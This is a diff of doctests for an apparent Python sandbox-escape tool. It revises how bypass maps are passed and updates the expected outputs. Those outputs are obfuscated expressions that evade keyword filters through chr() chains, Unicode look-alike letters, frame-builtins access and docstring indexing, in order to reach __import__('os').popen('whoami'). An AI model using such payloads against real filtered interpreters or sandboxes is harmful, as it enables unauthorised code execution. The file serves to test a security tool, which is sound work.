@@ -12,20 +12,13 @@ def _test(t_cls, t_func, payload, kwd, rekwd, **xargs):
     if t_cls == "Bypass_Combo":
         bmap = xargs["maps"]
     else:
-        bmap = {t_cls: [t_func]}
+        bmap = {t_cls: t_func}
 
     p9h_ins = p9h.P9H(
         payload,
         specify_bypass_map={
-            "white": dict(
-                {
-                    i: []
-                    for i in vars(p9h.bypass_tools)
-                    if i.startswith("Bypass_") and i != t_cls
-                },
-                **bmap
-            ),
-            "black": [],
+            "white": bmap,
+            "black": {},
         },
         depth=1,
         verbose=0,
@@ -231,7 +224,7 @@ def test_Name():
 
     # ----- 无法 bypass ----- 
     >>> _test("by_frame", "__import__", ["gi_frame.f_builtins"], r"^__import__$|gi_frame\\.f_builtins")
-    __import__
+    getattr((i for i in ()).gi_frame,'f_builtins')['__import__']
 
     >>> _test("by_running_frame", "__import__", ["gi_frame.f_builtins"], r"^__import__$|gi_frame\\.f_builtins")
     [[*a[0]].pop() for a in [[]] if [a.append((i.gi_frame.f_back for i in a))]][0].f_back.f_builtins['__import__']
@@ -264,16 +257,8 @@ def test_Attribute():
     >>> _test("by_vars", "os.system", [".", ], r"\\.")
     vars(os)['system']
 
-    # ----- 无法进行 bypass -----
-    >>> _test("by_vars", "(1+1).system", [".", ], r"\\.")
-    (1+1).system
-
     >>> _test("by_dict_attr", "os.system", [".system", ], r"\\.system")
     os.__dict__['system']
-
-    # ----- 无法进行 bypass -----
-    >>> _test("by_dict_attr", "(1+1).system", [".", ], r"\\.")
-    (1+1).system
     """
 
 
@@ -329,7 +314,7 @@ def test_BoolOp():
     'yes' if 1&(2|3)|2&3 else 'no'
 
     >>> _test("by_arithmetic", "'yes' if (__import__ and (2 or 3)) or (2 and 3) else 'no'", ["or", "and"], "or|and")
-    'yes' if ((__import__ and bool(2)+bool(3)) or bool(2)*bool(3)) else 'no'
+    'yes' if bool(bool(__imp𝒐rt__)*bool(bool(2)+bool(3)))+bool(bool(2)*bool(3)) else 'no'
     """
 
 
@@ -340,101 +325,98 @@ def test_Combo():
     >>> # ---------------------------------------------------
 
     >>> # ----- Int -----
-    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "1", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "True", "all"], r"\\d|all|True", maps=maps)
+    >>> maps = {"Bypass_Int": "by_cal"}; _test(..., "1", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "True", "all"], r"\\d|all|True", maps=maps)
     []==[]
 
-    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "12", ["1", "2", "True"], "1|2|True", maps=maps)
+    >>> maps = {"Bypass_Int": "by_cal"}; _test(..., "12", ["1", "2", "True"], "1|2|True", maps=maps)
     9+3
 
-    >>> maps = {"Bypass_Int": ["by_trans"]}; _test(..., "1", ["1", "True", "all", "(", "*", "+"], r"1|True|all|\\(|\\*|\\+", maps=maps)
+    >>> maps = {"Bypass_Int": "by_trans"}; _test(..., "1", ["1", "True", "all", "(", "*", "+"], r"1|True|all|\\(|\\*|\\+", maps=maps)
     []==[]
 
-    >>> maps = {"Bypass_Int": ["by_trans"]}; _test(..., "2", ["2", "True"], "2|True", maps=maps)
+    >>> maps = {"Bypass_Int": "by_trans"}; _test(..., "2", ["2", "True"], "2|True", maps=maps)
     len(str(()))
 
-    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "1", ["0", "1", "3", "4", "5", "6", "7", "8", "True", "False", "*", "+"], r"[0|1|3-8]|True|False|\\*|\\+", maps=maps)
+    >>> maps = {"Bypass_Int": "by_cal"}; _test(..., "1", ["0", "1", "3", "4", "5", "6", "7", "8", "True", "False", "*", "+"], r"[0|1|3-8]|True|False|\\*|\\+", maps=maps)
     all(())
 
-    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "-1", ["0", "1", "3", "4", "5", "6", "7", "8", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "True", "False", "*"], r"[0|1|3-8|a-z|True|False|\\*]", maps=maps)
+    >>> maps = {"Bypass_Int": "by_cal"}; _test(..., "-1", ["0", "1", "3", "4", "5", "6", "7", "8", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "True", "False", "*"], r"[0|1|3-8|a-z|True|False|\\*]", maps=maps)
     ([]==[])-2
 
-    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "-1", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "*", "+"], r"[0-9|\\*|\\+]", maps=maps)
+    >>> maps = {"Bypass_Int": "by_cal"}; _test(..., "-1", ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "*", "+"], r"[0-9|\\*|\\+]", maps=maps)
     True-len(str(()))
 
-    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "1000", ["0", "1", "2", "3", "4", "5", "6", "7", "9", "-", "*", "True", "False"], r"[0-6|7|9|\\-|\\*]|True|False", maps=maps)
+    >>> maps = {"Bypass_Int": "by_cal"}; _test(..., "1000", ["0", "1", "2", "3", "4", "5", "6", "7", "9", "-", "*", "True", "False"], r"[0-6|7|9|\\-|\\*]|True|False", maps=maps)
     8+8+8+88+888
 
-    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "2024", ["0", "1", "3", "4", "5", "6", "7", "8", "True", "False", "*"], r"[0|1|3-8]|True|False|\\*", maps=maps)
+    >>> maps = {"Bypass_Int": "by_cal"}; _test(..., "2024", ["0", "1", "3", "4", "5", "6", "7", "8", "True", "False", "*"], r"[0|1|3-8]|True|False|\\*", maps=maps)
     9+9+992+992+22
 
-    >>> maps = {"Bypass_Int": ["by_cal"]}; _test(..., "2024", ["1", "2", "4", "*"], r"1|2|4|\\*", maps=maps)
+    >>> maps = {"Bypass_Int": "by_cal"}; _test(..., "2024", ["1", "2", "4", "*"], r"1|2|4|\\*", maps=maps)
     99+995+930
 
     >>> # ----- String -----
-    >>> maps = {"Bypass_String": ["by_char_add", "by_dict"]}; _test(..., "'macr0phag3'", ["'", "\\"", "mac"], "'|\\"|mac", maps=maps)
+    >>> maps = {"Bypass_String": "by_char_add, by_dict"}; _test(..., "'macr0phag3'", ["'", "\\"", "mac"], "'|\\"|mac", maps=maps)
     (list(dict(m=()))[0]+list(dict(a=()))[0]+list(dict(c=()))[0]+list(dict(r=()))[0]+list(dict(a0=()))[0][1:]+list(dict(p=()))[0]+list(dict(h=()))[0]+list(dict(a=()))[0]+list(dict(g=()))[0]+list(dict(a3=()))[0][1:])
 
-    >>> maps = {"Bypass_String": ["by_char_add", "by_hex_encode"]}; _test(..., "'__import__'", ["__", "o"], "__|o", maps=maps)
+    >>> maps = {"Bypass_String": "by_char_add, by_hex_encode"}; _test(..., "'__import__'", ["__", "o"], "__|o", maps=maps)
     ('_'+'_'+'i'+'m'+'p'+'\\x6f'+'r'+'t'+'_'+'_')
 
-    >>> maps = {"Bypass_String": ["by_char_add", "by_unicode_encode"]}; _test(..., "'__import__'", ["__", "o"], "__|o", maps=maps)
+    >>> maps = {"Bypass_String": "by_char_add, by_unicode_encode"}; _test(..., "'__import__'", ["__", "o"], "__|o", maps=maps)
     ('_'+'_'+'i'+'m'+'p'+'\\u006f'+'r'+'t'+'_'+'_')
 
-    >>> maps = {"Bypass_String": ["by_char_add", "by_char_format"]}; _test(..., "'__import__'", ["__", "o"], "__|o|𝒐", maps=maps)
+    >>> maps = {"Bypass_String": "by_char_add, by_char_format"}; _test(..., "'__import__'", ["__", "o"], "__|o|𝒐", maps=maps)
     ('_'+'_'+'i'+'m'+'p'+'%c'%111+'r'+'t'+'_'+'_')
 
-    >>> maps = {"Bypass_String": ["by_char_add", "by_format", "by_char"]}; _test(..., "'__import__'", ["__", "'", '"'], "__|'|\\"", maps=maps)
-    ((chr(123)+chr(125)).format(chr(95))+(chr(123)+chr(125)).format(chr(95))+(chr(123)+chr(125)).format(chr(105))+(chr(123)+chr(125)).format(chr(109))+(chr(123)+chr(125)).format(chr(112))+(chr(123)+chr(125)).format(chr(111))+(chr(123)+chr(125)).format(chr(114))+(chr(123)+chr(125)).format(chr(116))+(chr(123)+chr(125)).format(chr(95))+(chr(123)+chr(125)).format(chr(95)))
+    >>> maps = {"Bypass_String": "by_char_add, by_format, by_char"}; _test(..., "'__import__'", ["__", "'", '"'], "__|'|\\"", maps=maps)
+    (((chr(123)+chr(125)).format(chr(123))+(chr(123)+chr(125)).format(chr(125))).format(chr(95))+((chr(123)+chr(125)).format(chr(123))+(chr(123)+chr(125)).format(chr(125))).format(chr(95))+((chr(123)+chr(125)).format(chr(123))+(chr(123)+chr(125)).format(chr(125))).format(chr(105))+((chr(123)+chr(125)).format(chr(123))+(chr(123)+chr(125)).format(chr(125))).format(chr(109))+((chr(123)+chr(125)).format(chr(123))+(chr(123)+chr(125)).format(chr(125))).format(chr(112))+((chr(123)+chr(125)).format(chr(123))+(chr(123)+chr(125)).format(chr(125))).format(chr(111))+((chr(123)+chr(125)).format(chr(123))+(chr(123)+chr(125)).format(chr(125))).format(chr(114))+((chr(123)+chr(125)).format(chr(123))+(chr(123)+chr(125)).format(chr(125))).format(chr(116))+((chr(123)+chr(125)).format(chr(123))+(chr(123)+chr(125)).format(chr(125))).format(chr(95))+((chr(123)+chr(125)).format(chr(123))+(chr(123)+chr(125)).format(chr(125))).format(chr(95)))
 
-    >>> maps = {"Bypass_String": ["by_char_add", "by_char"]}; _test(..., "'__import__'", ["__", "o"], "__|o", maps=maps)
+    >>> maps = {"Bypass_String": "by_char_add, by_char"}; _test(..., "'__import__'", ["__", "o"], "__|o", maps=maps)
     ('_'+'_'+'i'+'m'+'p'+chr(111)+'r'+'t'+'_'+'_')
 
-    >>> maps = {"Bypass_String": ["by_char_add", "by_bytes_single"]}; _test(..., "'__import__'", ["__", "i"], "__|i", maps=maps)
+    >>> maps = {"Bypass_String": "by_char_add, by_bytes_single"}; _test(..., "'__import__'", ["__", "i"], "__|i", maps=maps)
     ('_'+'_'+str(bytes([105]))[2]+'m'+'p'+'o'+'r'+'t'+'_'+'_')
 
-    >>> maps = {"Bypass_String": ["by_char_add", "by_bytes_full"]}; _test(..., "'__import__'", ["__", "i"], "__|i", maps=maps)
+    >>> maps = {"Bypass_String": "by_char_add, by_bytes_full"}; _test(..., "'__import__'", ["__", "i"], "__|i", maps=maps)
     ('_'+'_'+bytes([105]).decode()+'m'+'p'+'o'+'r'+'t'+'_'+'_')
 
-    >>> maps = {"Bypass_String": ["by_hex_encode", "by_dict"], "Bypass_Name": ["by_unicode"], "Bypass_Keyword": ["by_unicode"]}; _test(..., "'__import__'", ["__", "x"], "__|x", maps=maps)
-    ma𝒙(dict(_＿import_＿=()))
+    >>> maps = {"Bypass_String": "by_hex_encode, by_dict", "Bypass_Name": "by_unicode", "Bypass_Keyword": "by_unicode"}; _test(..., "'__import__'", ["__", "n"], "__|n", maps=maps)
+    mi𝒏(dict(_＿import_＿=()))
 
     >>> # ----- Attribute -----
-    >>> maps = {"Bypass_Attribute": ["by_getattr"], "Bypass_String": ["by_dict"], "Bypass_Keyword": ["by_unicode"]}; _test(..., "os.system", [".", "sys", '"', "'"], r"\\.|sys|'|\\\"", maps=maps)
-    getattr(os,max(dict(𝒔ystem=())))
+    >>> maps = {"Bypass_Attribute": "by_getattr", "Bypass_String": "by_dict", "Bypass_Keyword": "by_unicode"}; _test(..., "os.system", [".", "sys", '"', "'"], r"\\.|sys|'|\\\"", maps=maps)
+    getattr(os,min(dict(𝒔ystem=())))
 
-    >>> maps = {"Bypass_Attribute": ["by_vars"], "Bypass_String": ["by_dict"], "Bypass_Keyword": ["by_unicode"]}; _test(..., "os.system", [".", "sys", '"', "'"], r"\\.|sys|'|\\\"", maps=maps)
-    vars(os)[max(dict(𝒔ystem=()))]
+    >>> maps = {"Bypass_Attribute": "by_vars", "Bypass_String": "by_dict", "Bypass_Keyword": "by_unicode"}; _test(..., "os.system", [".", "sys", '"', "'"], r"\\.|sys|'|\\\"", maps=maps)
+    vars(os)[min(dict(𝒔ystem=()))]
 
     >>> # ----- Call -----
-    >>> maps = {"Bypass_Call": ["by_builtin_func_self"]}; _test(..., "__import__('os')", [], "^__import__[(]", maps=maps)
+    >>> maps = {"Bypass_Call": "by_builtin_func_self"}; _test(..., "__import__('os')", [], "^__import__[(]", maps=maps)
     id.__self__.__import__('os')
 
-    >>> maps = {"Bypass_Call": ["by_vars"], "Bypass_String": ["by_dict"], "Bypass_Keyword": ["by_unicode"]}; _test(..., "os.system(1)", [".", "sys", '"', "'"], r"\\.|sys|'|\\\"", maps=maps)
-    vars(os)[max(dict(𝒔ystem=()))](1)
-
-    >>> maps = {"Bypass_Call": ["by_unicode"]}; _test(..., "id('x')", ["id"], r"id", maps=maps)
-    𝒊d('x')
+    >>> maps = {"Bypass_Call": "by_builtins_item"}; _test(..., "__import__('os')", [], "^__import__[(]", maps=maps)
+    __builtins__['__import__']('os')
 
     >>> # ----- Name -----
-    >>> maps = {"Bypass_Name": ["by_builtins_attr"], "Bypass_String": ["by_char_add", "by_char"], "Bypass_Attribute": ["by_getattr"]}; _test(..., "__import__", [".", "import", '"', "'"], r"\\.|import|'|\\\"", maps=maps)
+    >>> maps = {"Bypass_Name": "by_builtins_attr", "Bypass_String": "by_char_add, by_char", "Bypass_Attribute": "by_getattr"}; _test(..., "__import__", [".", "import", '"', "'"], r"\\.|import|'|\\\"", maps=maps)
     getattr(__builtins__,(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)))
 
     >>> # ----- Integrated -----
-    >>> maps = {"Bypass_Name": ["by_builtins_attr"], "Bypass_String": ["by_char_add", "by_char"], "Bypass_Attribute": ["by_getattr"]}; _test(..., "__import__('os').popen('whoami').read()", [".", "import", '"', "'"], r"\\.|import|'|\\\"", maps=maps)
+    >>> maps = {"Bypass_Name": "by_builtins_attr", "Bypass_String": "by_char_add, by_char", "Bypass_Attribute": "by_getattr"}; _test(..., "__import__('os').popen('whoami').read()", [".", "import", '"', "'"], r"\\.|import|'|\\\"", maps=maps)
     getattr(getattr(getattr(__builtins__,chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95))(chr(111)+chr(115)),chr(112)+chr(111)+chr(112)+chr(101)+chr(110))(chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105)),(chr(114)+chr(101)+chr(97)+chr(100)))()
 
-    >>> maps = {"Bypass_Name": ["by_builtins_item"], "Bypass_String": ["by_char_add", "by_char"]}; _test(..., "__import__('os')", ["import", '"', "'"], r"import|'|\\\"", maps=maps)
+    >>> maps = {"Bypass_Name": "by_builtins_item", "Bypass_String": "by_char_add, by_char"}; _test(..., "__import__('os')", ["import", '"', "'"], r"import|'|\\\"", maps=maps)
     __builtins__[(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95))]((chr(111)+chr(115)))
 
-    >>> maps = {"Bypass_Name": ["by_frame"], "Bypass_String": ["by_char_add"]}; _test(..., '__import__("os")', [], "__|＿", maps=maps)
+    >>> maps = {"Bypass_Name": "by_frame", "Bypass_String": "by_char_add"}; _test(..., '__import__("os")', ["__", "＿"], "__|＿", maps=maps)
     (i for i in ()).gi_frame.f_builtins[('_'+'_'+'i'+'m'+'p'+'o'+'r'+'t'+'_'+'_')]('os')
 
-    >>> maps = {"Bypass_Name": ["by_unicode"], "Bypass_String": ["by_char", "by_char_add", "by_char_format"], "Bypass_Attribute": ["by_getattr"]}; _test(..., "__import__('os').popen('whoami').read()", ["__", ".", "'", '"', "read", "chr"], r"__|\\.|'|\\\"|read|chr", maps=maps)
-    getattr(getattr(_＿import_＿((𝒄hr(37)+𝒄hr(99))%111+(𝒄hr(37)+𝒄hr(99))%115),(𝒄hr(37)+𝒄hr(99))%112+(𝒄hr(37)+𝒄hr(99))%111+(𝒄hr(37)+𝒄hr(99))%112+(𝒄hr(37)+𝒄hr(99))%101+(𝒄hr(37)+𝒄hr(99))%110)((𝒄hr(37)+𝒄hr(99))%119+(𝒄hr(37)+𝒄hr(99))%104+(𝒄hr(37)+𝒄hr(99))%111+(𝒄hr(37)+𝒄hr(99))%97+(𝒄hr(37)+𝒄hr(99))%109+(𝒄hr(37)+𝒄hr(99))%105),((𝒄hr(37)+𝒄hr(99))%114+(𝒄hr(37)+𝒄hr(99))%101+(𝒄hr(37)+𝒄hr(99))%97+(𝒄hr(37)+𝒄hr(99))%100))()
+    >>> maps = {"Bypass_Name": "by_unicode", "Bypass_String": "by_char, by_char_add, by_char_format", "Bypass_Attribute": "by_getattr"}; _test(..., "__import__('os').popen('whoami').read()", ["__", ".", "'", '"', "read", "chr"], r"__|\\.|'|\\\"|read|chr", maps=maps)
+    getattr(getattr(_＿import_＿(((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%111+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%115),((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%112+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%111+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%112+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%101+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%110)(((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%119+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%104+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%111+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%97+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%109+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%105),(((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%114+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%101+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%97+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%100))()
 
-    >>> maps = {"Bypass_Name": ["by_unicode"], "Bypass_String": ["by_char", "by_char_add", "by_char_format"], "Bypass_Attribute": ["by_getattr"], "Bypass_Int": ["by_cal"],}; _test(..., "__import__('os').popen('whoami').read()", ["__", ".", "'", '"', "read", "chr", "0", "1"], r"__|\\.|'|\\\"|read|chr|0|1", maps=maps)
-    getattr(getattr(_＿import_＿((𝒄hr(37)+𝒄hr(99))%(3*37)+(𝒄hr(37)+𝒄hr(99))%(5*23)),(𝒄hr(37)+𝒄hr(99))%(4*28)+(𝒄hr(37)+𝒄hr(99))%(3*37)+(𝒄hr(37)+𝒄hr(99))%(4*28)+(𝒄hr(37)+𝒄hr(99))%(9+92)+(𝒄hr(37)+𝒄hr(99))%(5*22))((𝒄hr(37)+𝒄hr(99))%(998-879)+(𝒄hr(37)+𝒄hr(99))%(9+95)+(𝒄hr(37)+𝒄hr(99))%(3*37)+(𝒄hr(37)+𝒄hr(99))%97+(𝒄hr(37)+𝒄hr(99))%(998-889)+(𝒄hr(37)+𝒄hr(99))%(9+96)),((𝒄hr(37)+𝒄hr(99))%(3*38)+(𝒄hr(37)+𝒄hr(99))%(9+92)+(𝒄hr(37)+𝒄hr(99))%97+(𝒄hr(37)+𝒄hr(99))%(8+92)))()
+    >>> maps = {"Bypass_Name": "by_unicode", "Bypass_String": "by_char, by_char_add, by_char_format", "Bypass_Attribute": "by_getattr", "Bypass_Int": "by_cal"}; _test(..., "__import__('os').popen('whoami').read()", ["__", ".", "'", '"', "read", "chr", "0", "1"], r"__|\\.|'|\\\"|read|chr|0|1", maps=maps)
+    getattr(getattr(_＿import_＿(((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(3*37)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(5*23)),((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(4*28)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(3*37)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(4*28)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(9+92)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(5*22))(((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(998-879)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(9+95)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(3*37)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%97+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(998-889)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(9+96)),(((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(3*38)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(9+92)+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%97+((𝒄hr(37)+𝒄hr(99))%37+(𝒄hr(37)+𝒄hr(99))%99)%(8+92)))()
 
-    >>> maps = {"Bypass_String": ["by_doc_index"]}; _test(..., "__import__('os').popen('whoami').read()", ["'", '"', "os", "sys", "a", "b"], "os|sys|'|\\\"|a|b", maps=maps)
+    >>> maps = {"Bypass_String": "by_doc_index"}; _test(..., "__import__('os').popen('whoami').read()", ["'", '"', "os", "sys", "b"], "os|sys|'|\\\"|b", maps=maps)
     __import__((id.__doc__[20]+id.__doc__[38])).popen((dir.__doc__[44]+dir.__doc__[47]+dir.__doc__[5]+dir.__doc__[38]+dir.__doc__[59]+dir.__doc__[1])).read()
     """
